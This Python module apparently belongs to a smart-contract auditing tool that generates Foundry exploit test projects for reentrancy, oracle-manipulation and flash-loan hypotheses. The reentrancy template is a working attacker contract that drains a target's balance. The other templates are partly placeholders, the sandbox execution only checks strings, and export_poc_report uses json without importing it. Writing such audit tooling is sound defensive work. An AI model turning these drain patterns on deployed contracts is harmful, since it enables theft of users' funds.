"""
PoC Generation Framework - Automated Proof of Concept Generation
Generates Foundry/Hardhat test scripts for vulnerability hypotheses
"""

from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum
from datetime import datetime
import os
import tempfile


class PoCFramework(Enum):
    """Supported PoC frameworks"""
    FOUNDRY = "foundry"
    HARDHAT = "hardhat"
    BROWNIE = "brownie"


@dataclass
class PoCTemplate:
    """Template for generating PoCs"""
    framework: PoCFramework
    vulnerability_type: str
    template_code: str
    required_imports: List[str]
    setup_code: str
    exploit_code: str
    validation_code: str


@dataclass
class PoCResult:
    """Result from PoC generation and execution"""
    hypothesis_id: str
    framework: PoCFramework
    generated_code: str
    execution_successful: bool
    exploit_demonstrated: bool
    output: str
    gas_used: int = 0
    profit_extracted: str = "0"
    timestamp: str = ""
    error_message: str = ""


class PoCGenerator:
    """
    Automated PoC generation for vulnerability hypotheses
    Generates safe, sandboxed test scripts
    """
    
    def __init__(self, framework: PoCFramework = PoCFramework.FOUNDRY):
        self.framework = framework
        self.poc_templates: Dict[str, PoCTemplate] = {}
        self.generated_pocs: List[PoCResult] = []
        self._initialize_templates()
        
    def _initialize_templates(self):
        """Initialize PoC templates for different vulnerability types"""
        
        # Reentrancy PoC template (Foundry)
        self.register_template(PoCTemplate(
            framework=PoCFramework.FOUNDRY,
            vulnerability_type="reentrancy",
            template_code="""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/{contract_name}.sol";

contract ReentrancyExploit is Test {{
    {contract_name} target;
    Attacker attacker;
    
    function setUp() public {{
        target = new {contract_name}();
        attacker = new Attacker(address(target));
        
        // Fund the contract
        vm.deal(address(target), 10 ether);
    }}
    
    function testReentrancy() public {{
        // Fund attacker
        vm.deal(address(attacker), 1 ether);
        
        // Record initial balances
        uint256 initialTargetBalance = address(target).balance;
        uint256 initialAttackerBalance = address(attacker).balance;
        
        // Execute attack
        attacker.attack{{value: 1 ether}}();
        
        // Verify exploit
        uint256 finalTargetBalance = address(target).balance;
        uint256 finalAttackerBalance = address(attacker).balance;
        
        // Attacker should have drained funds
        assertGt(finalAttackerBalance, initialAttackerBalance);
        assertLt(finalTargetBalance, initialTargetBalance);
        
        console.log("Funds extracted:", finalAttackerBalance - initialAttackerBalance);
    }}
}}

contract Attacker {{
    {contract_name} target;
    uint256 public count;
    
    constructor(address _target) {{
        target = {contract_name}(_target);
    }}
    
    function attack() external payable {{
        target.deposit{{value: msg.value}}();
        target.withdraw(msg.value);
    }}
    
    receive() external payable {{
        if (address(target).balance >= 1 ether && count < 5) {{
            count++;
            target.withdraw(1 ether);
        }}
    }}
}}""",
            required_imports=["forge-std/Test.sol"],
            setup_code="// Setup in setUp() function",
            exploit_code="// Exploit in testReentrancy()",
            validation_code="// Assertions verify exploit"
        ))
        
        # Oracle manipulation PoC template
        self.register_template(PoCTemplate(
            framework=PoCFramework.FOUNDRY,
            vulnerability_type="oracle_manipulation",
            template_code="""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/{contract_name}.sol";

contract OracleManipulationExploit is Test {{
    {contract_name} target;
    MockOracle mockOracle;
    
    function setUp() public {{
        mockOracle = new MockOracle();
        target = new {contract_name}(address(mockOracle));
    }}
    
    function testOracleManipulation() public {{
        // Set legitimate price
        mockOracle.setPrice(1000e18);
        
        // Get initial state
        uint256 initialValue = target.getValue();
        
        // Manipulate oracle price
        mockOracle.setPrice(10000e18); // 10x increase
        
        // Exploit the manipulated price
        uint256 exploitAmount = target.calculateValue();
        
        // Verify manipulation impact
        assertGt(exploitAmount, initialValue * 5);
        
        console.log("Price manipulation profit:", exploitAmount - initialValue);
    }}
}}

contract MockOracle {{
    uint256 public price;
    
    function setPrice(uint256 _price) external {{
        price = _price;
    }}
    
    function latestAnswer() external view returns (uint256) {{
        return price;
    }}
}}""",
            required_imports=["forge-std/Test.sol"],
            setup_code="// Oracle setup in setUp()",
            exploit_code="// Price manipulation in test",
            validation_code="// Price impact verification"
        ))
        
        # Flash loan attack PoC template
        self.register_template(PoCTemplate(
            framework=PoCFramework.FOUNDRY,
            vulnerability_type="flash_loan",
            template_code="""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/{contract_name}.sol";

contract FlashLoanExploit is Test {{
    {contract_name} target;
    FlashLoanProvider lender;
    Exploiter exploiter;
    
    function setUp() public {{
        lender = new FlashLoanProvider();
        target = new {contract_name}();
        exploiter = new Exploiter(address(target), address(lender));
        
        // Fund flash loan pool
        vm.deal(address(lender), 1000 ether);
    }}
    
    function testFlashLoanAttack() public {{
        uint256 initialBalance = address(exploiter).balance;
        
        // Execute flash loan attack
        exploiter.executeAttack(100 ether);
        
        uint256 finalBalance = address(exploiter).balance;
        uint256 profit = finalBalance - initialBalance;
        
        // Verify profit
        assertGt(profit, 0);
        console.log("Flash loan profit:", profit);
    }}
}}

contract FlashLoanProvider {{
    function flashLoan(uint256 amount, address borrower) external {{
        uint256 balanceBefore = address(this).balance;
        
        payable(borrower).call{{value: amount}}("");
        
        require(address(this).balance >= balanceBefore, "Flash loan not repaid");
    }}
    
    receive() external payable {{}}
}}

contract Exploiter {{
    {contract_name} target;
    FlashLoanProvider lender;
    
    constructor(address _target, address _lender) {{
        target = {contract_name}(_target);
        lender = FlashLoanProvider(_lender);
    }}
    
    function executeAttack(uint256 loanAmount) external {{
        lender.flashLoan(loanAmount, address(this));
    }}
    
    receive() external payable {{
        // Use flash loan to exploit
        // ... exploit logic here ...
        
        // Repay flash loan
        payable(address(lender)).transfer(msg.value);
    }}
}}""",
            required_imports=["forge-std/Test.sol"],
            setup_code="// Flash loan setup",
            exploit_code="// Attack execution",
            validation_code="// Profit verification"
        ))
    
    def register_template(self, template: PoCTemplate):
        """Register a PoC template"""
        key = f"{template.framework.value}_{template.vulnerability_type}"
        self.poc_templates[key] = template
    
    def generate_poc(self,
                    hypothesis: Any,
                    contract_code: str,
                    contract_name: str = "VulnerableContract") -> str:
        """
        Generate PoC code for a hypothesis
        """
        # Determine vulnerability type from hypothesis
        vuln_type = self._map_hypothesis_to_vuln_type(hypothesis)
        
        # Get template
        template_key = f"{self.framework.value}_{vuln_type}"
        template = self.poc_templates.get(template_key)
        
        if not template:
            # Fallback to generic template
            return self._generate_generic_poc(hypothesis, contract_code, contract_name)
        
        # Fill template with contract-specific information
        poc_code = template.template_code.format(
            contract_name=contract_name,
            vulnerability_description=getattr(hypothesis, 'description', ''),
            attack_scenario=getattr(hypothesis, 'attack_scenario', '')
        )
        
        return poc_code
    
    def generate_and_execute(self,
                            hypothesis: Any,
                            contract_code: str,
                            contract_name: str = "VulnerableContract",
                            execute: bool = False) -> Dict[str, Any]:
        """
        Generate PoC and optionally execute it in sandbox
        """
        # Generate PoC code
        poc_code = self.generate_poc(hypothesis, contract_code, contract_name)
        
        result = {
            "success": False,
            "poc_code": poc_code,
            "description": getattr(hypothesis, 'description', ''),
            "output": ""
        }
        
        if execute:
            # Execute in sandboxed environment
            execution_result = self._execute_poc_sandboxed(poc_code, contract_code)
            result.update(execution_result)
        
        # Store result
        poc_result = PoCResult(
            hypothesis_id=getattr(hypothesis, 'id', 'unknown'),
            framework=self.framework,
            generated_code=poc_code,
            execution_successful=result.get("success", False),
            exploit_demonstrated=result.get("exploit_demonstrated", False),
            output=result.get("output", ""),
            timestamp=datetime.now().isoformat()
        )
        
        self.generated_pocs.append(poc_result)
        
        return result
    
    def _map_hypothesis_to_vuln_type(self, hypothesis: Any) -> str:
        """Map hypothesis type to PoC template type"""
        if not hasattr(hypothesis, 'type'):
            return "generic"
        
        hypothesis_type = hypothesis.type.value if hasattr(hypothesis.type, 'value') else str(hypothesis.type)
        
        # Map hypothesis types to PoC template types
        type_mapping = {
            "reentrancy": "reentrancy",
            "oracle_manipulation": "oracle_manipulation",
            "economic_exploit": "flash_loan",
            "flash_loan": "flash_loan",
            "access_control": "access_control",
            "cross_contract": "cross_contract"
        }
        
        for key, template_type in type_mapping.items():
            if key in hypothesis_type.lower():
                return template_type
        
        return "generic"
    
    def _generate_generic_poc(self,
                             hypothesis: Any,
                             contract_code: str,
                             contract_name: str) -> str:
        """Generate a generic PoC when no specific template exists"""
        return f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/{contract_name}.sol";

/**
 * PoC for: {getattr(hypothesis, 'description', 'Unknown vulnerability')}
 * 
 * Attack Scenario:
 * {getattr(hypothesis, 'attack_scenario', 'Not specified')}
 * 
 * Severity: {getattr(hypothesis, 'severity', 'unknown')}
 * Confidence: {getattr(hypothesis, 'confidence', 0.0)}
 */
contract GenericExploit is Test {{
    {contract_name} target;
    
    function setUp() public {{
        target = new {contract_name}();
        // Add setup code here
    }}
    
    function testVulnerability() public {{
        // 1. Setup initial state
        uint256 initialState = 0; // Customize based on contract
        
        // 2. Execute exploit
        // TODO: Implement specific exploit logic
        
        // 3. Verify vulnerability exists
        // TODO: Add assertions
        
        console.log("Vulnerability test executed");
    }}
}}
"""
    
    def _execute_poc_sandboxed(self,
                              poc_code: str,
                              contract_code: str) -> Dict[str, Any]:
        """
        Execute PoC in sandboxed environment
        WARNING: This is a placeholder - actual implementation would use
        isolated containers or test networks
        """
        result = {
            "success": False,
            "exploit_demonstrated": False,
            "output": "",
            "error": ""
        }
        
        # In production, this would:
        # 1. Create isolated test environment (Docker, VM, or local testnet)
        # 2. Deploy contracts
        # 3. Execute PoC test
        # 4. Capture results
        # 5. Cleanup environment
        
        # For now, just validate the code structure
        try:
            if "function test" in poc_code and "import" in poc_code:
                result["success"] = True
                result["output"] = "PoC generated successfully (not executed in sandbox)"
            else:
                result["error"] = "Invalid PoC structure"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def generate_foundry_project(self,
                                hypotheses: List[Any],
                                contract_code: str,
                                contract_name: str,
                                output_dir: str) -> str:
        """
        Generate a complete Foundry project with PoCs for all hypotheses
        """
        os.makedirs(output_dir, exist_ok=True)
        
        # Create directory structure
        src_dir = os.path.join(output_dir, "src")
        test_dir = os.path.join(output_dir, "test")
        os.makedirs(src_dir, exist_ok=True)
        os.makedirs(test_dir, exist_ok=True)
        
        # Write contract to src/
        contract_path = os.path.join(src_dir, f"{contract_name}.sol")
        with open(contract_path, 'w') as f:
            f.write(contract_code)
        
        # Generate PoC for each hypothesis
        for i, hypothesis in enumerate(hypotheses):
            poc_code = self.generate_poc(hypothesis, contract_code, contract_name)
            poc_path = os.path.join(test_dir, f"Exploit{i+1}.t.sol")
            
            with open(poc_path, 'w') as f:
                f.write(poc_code)
        
        # Create foundry.toml
        foundry_config = """[profile.default]
src = 'src'
out = 'out'
libs = ['lib']
solc_version = '0.8.19'

[profile.default.fuzz]
runs = 256
"""
        with open(os.path.join(output_dir, "foundry.toml"), 'w') as f:
            f.write(foundry_config)
        
        # Create README
        readme = f"""# Vulnerability PoC Project

Generated on: {datetime.now().isoformat()}

## Contract
- Name: {contract_name}
- Location: src/{contract_name}.sol

## Exploits
{len(hypotheses)} proof-of-concept exploits generated in test/ directory.

## Running Tests

```bash
forge test -vvv
```

## Individual Test Execution

```bash
forge test --match-test testReentrancy -vvv
```

## Hypotheses Tested

{chr(10).join([f"{i+1}. {getattr(h, 'description', 'Unknown')} (Severity: {getattr(h, 'severity', 'unknown')})" for i, h in enumerate(hypotheses)])}
"""
        with open(os.path.join(output_dir, "README.md"), 'w') as f:
            f.write(readme)
        
        return output_dir
    
    def get_poc_stats(self) -> Dict[str, Any]:
        """Get statistics about generated PoCs"""
        if not self.generated_pocs:
            return {
                "total_generated": 0,
                "successful_executions": 0,
                "exploits_demonstrated": 0
            }
        
        return {
            "total_generated": len(self.generated_pocs),
            "successful_executions": len([p for p in self.generated_pocs if p.execution_successful]),
            "exploits_demonstrated": len([p for p in self.generated_pocs if p.exploit_demonstrated]),
            "by_framework": self._count_by_framework(),
            "by_vulnerability_type": self._count_by_vuln_type()
        }
    
    def _count_by_framework(self) -> Dict[str, int]:
        """Count PoCs by framework"""
        counts = {}
        for poc in self.generated_pocs:
            framework = poc.framework.value
            counts[framework] = counts.get(framework, 0) + 1
        return counts
    
    def _count_by_vuln_type(self) -> Dict[str, int]:
        """Count PoCs by vulnerability type"""
        # This would need to be tracked during generation
        return {}
    
    def export_poc_report(self, filepath: str):
        """Export PoC generation report"""
        report = {
            "statistics": self.get_poc_stats(),
            "generated_pocs": [
                {
                    "hypothesis_id": poc.hypothesis_id,
                    "framework": poc.framework.value,
                    "execution_successful": poc.execution_successful,
                    "exploit_demonstrated": poc.exploit_demonstrated,
                    "timestamp": poc.timestamp,
                    "code_preview": poc.generated_code[:500] + "..."
                }
                for poc in self.generated_pocs
            ]
        }
        
        with open(filepath, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"✓ PoC report exported to {filepath}")
